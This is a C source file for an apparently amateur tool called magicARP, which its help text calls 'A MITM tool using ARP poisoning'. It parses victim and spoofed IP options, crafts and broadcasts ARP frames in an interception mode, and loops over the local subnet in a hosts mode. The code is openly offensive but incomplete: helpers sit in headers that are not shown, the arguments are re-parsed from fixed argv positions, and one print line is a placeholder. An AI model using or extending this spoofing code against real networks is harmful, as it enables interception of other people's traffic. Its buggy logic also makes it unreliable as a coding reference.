#include "helpers.h"
#include "parsers.h"
#include "sock_ops.h"
#include "packet_builders.h"

#include <sys/ioctl.h>
#include <net/if.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <getopt.h>

struct ifreq ifr;
uint8_t *hwaddr;
int if_index;

uint8_t mitm_mode = 0;
uint8_t hosts_mode = 0;

int options_index;
int c;

uint32_t spa, tpa;
char if_name[IFNAMSIZ];

static struct option long_options[] =
{
  {"mitm",      no_argument,       0, '0'},
  {"hosts",     no_argument,       0, '1'},
  {"interface", required_argument, 0, 'i'},
  {"victim",    required_argument, 0, 'v'},
  {"spoofed",   required_argument, 0, 's'},
  {0, 0, 0, 0}
};

void print_help();

int main(int argc, char *argv[]) {
    
    opterr = 0;
    
    while((c = getopt_long(argc, argv, "01i:v:s:", long_options,
                           &options_index)) != -1){
        switch(c){
            case '0': 
                mitm_mode = 1;
                break;
            case '1':
                hosts_mode = 1;
                break;
            case 'i':
                strncpy(if_name, optarg, IFNAMSIZ);
                break;
            case 'v':
                if(inet_pton(AF_INET, optarg, &spa) == 0){ 
                    printf("Enter valid IP format\n");
                    exit(1);
                }
                break;
            case 's':
                if(inet_pton(AF_INET, optarg, &tpa) == 0){ 
                    printf("Enter valid IP format\n");
                    exit(1);
                }
                break;
            case '?':
                print_help();
                exit(1);
        }
    }
    
    int sock = make_socket(if_name);

    if_index = get_if_index(sock, if_name);


    inet_pton(AF_INET, argv[2], &spa);
    inet_pton(AF_INET, argv[3], &tpa);

    hwaddr = get_if_hwaddr(sock, if_name);
    
    struct arp_pac packet = build_arp_request(spa, tpa, hwaddr);
    
    if(mitm_mode)
        broadcast_frame(sock, &packet);
    
    if(hosts_mode){
        unsigned long netmask = get_if_netmask(sock, if_name);
        unsigned long min_local_ip = (spa & netmask) + 1;
        unsigned long max_local_ip = (~netmask | spa) - 1;
        for(unsigned long i = min_local_ip ; i < max_local_ip ; ++ i){
            printf("Sending to: %s", "pp");
            memcpy(packet.spa, &i, sizeof(uint8_t) * 4);
            broadcast_frame(sock, &packet);
        }
    }
    return 0;
}

void print_help(){
    printf("Usage: magicARP MODE [OPTION...]\n");
    printf("A MITM tool using ARP poisoning\n");
    printf("  MODES:\n");
    printf("    -0, --mitm\tBegin trafic interseption\n");
    printf("    -1, --hosts\tList all hosts on network\n");
    printf("  OPTIONS:\n");
    printf("    -i, --iface\tSpecify network interface\n");
    printf("    -v, --victim\tSet victim IP\n");
    printf("    -s, --spoofed\tSet spoofed IP\n");
}


